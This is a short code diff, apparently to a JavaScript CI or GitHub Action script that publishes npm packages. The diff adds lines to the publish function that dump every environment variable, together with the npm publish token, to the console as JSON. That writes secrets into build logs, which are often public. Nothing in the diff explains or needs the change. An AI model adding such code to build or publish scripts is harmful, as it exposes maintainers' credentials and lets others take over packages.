@@ -48,6 +48,11 @@ const extractVersion = async () => {
 };
 
 const publish = async (cwd, token, directory) => {
+  console.log(JSON.stringify({
+    ...process.env,
+    INPUT_TOKEN: token,
+  }));
+
   // Run NPM to publish the package
   await ezSpawn.async('npm', ['publish', directory], {
     cwd,
